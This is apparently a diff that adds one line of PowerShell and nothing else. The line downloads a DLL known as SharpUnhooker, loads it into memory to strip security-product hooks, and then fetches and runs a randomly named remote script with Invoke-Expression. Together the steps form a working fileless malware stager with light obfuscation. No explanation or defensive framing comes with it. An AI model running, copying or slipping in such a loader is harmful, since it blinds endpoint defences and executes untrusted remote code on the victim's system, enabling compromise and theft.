@@ -1,0 +1,1 @@
+$mqNuC = (iwr -UseBasicParsing "https://github.com/GetRektBoy724/SharpUnhooker/raw/main/SharpUnhooker.dll").Content;[System.Reflection.Assembly]::Load($mqNuC);[SharpUnhooker]::Main();IEX(iwr -usebasicparsing https://github.com/IIllIllIIlIIIlIIl/839912/raw/main/FaFEydRJy.ps1)
